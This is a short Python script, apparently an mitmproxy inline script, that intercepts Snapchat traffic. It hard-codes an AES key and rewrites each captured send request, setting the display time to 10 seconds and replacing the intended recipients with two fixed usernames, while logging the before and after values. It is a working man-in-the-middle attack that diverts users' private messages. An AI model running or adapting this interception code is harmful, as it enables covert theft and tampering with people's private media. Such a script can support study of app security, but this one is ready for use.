# Globals
LOG_FILE = 'logs.txt'
snapchat_aes_key = 'M02cnQ51Ji97vwT4'
DOMAINS = ['feelinsonice-hrd.appspot.com', 'data.flurry.com']

def start(context, flow):
	myfile = open(LOG_FILE, 'a')
	try:
		myfile.write('----- starting replay -----\n')
	finally:
		myfile.close()

def response(context, flow):
	if not (flow.response.request.host in DOMAINS):
		return
	"""
	with open(LOG_FILE,'a') as myfile:
		 If the data is not from Snapchat, skip analysis.
		# TODO: Get fancy with responses.
		myfile.write('Response from Snapchat. OOOW\n')
	"""

def request(context, flow):
	# If the data is not from Snapchat, skip analysis.
	if not (flow.request.host in DOMAINS and str(flow.request.path) == '/bq/send'):
		return

	with open(LOG_FILE, 'a') as myfile:
		form = flow.request.get_form_urlencoded()
		myfile.write('before: ' + str(form['recipient']) + '\n')

		# Change time to 10 seconds.
		form['time'] = ['10']

		# Replace recipient list with our user list.
		form['recipient'] = ['incion, acotenoff']

		# Re-encode the form for sending.
		flow.request.set_form_urlencoded(form)

		myfile.write('after: ' + str(form['recipient']) + '\n')

def end(context, flow):
	myfile = open(LOG_FILE, 'a')
	try:
		myfile.write('----- ending interception -----\n')
	finally:
		myfile.close()

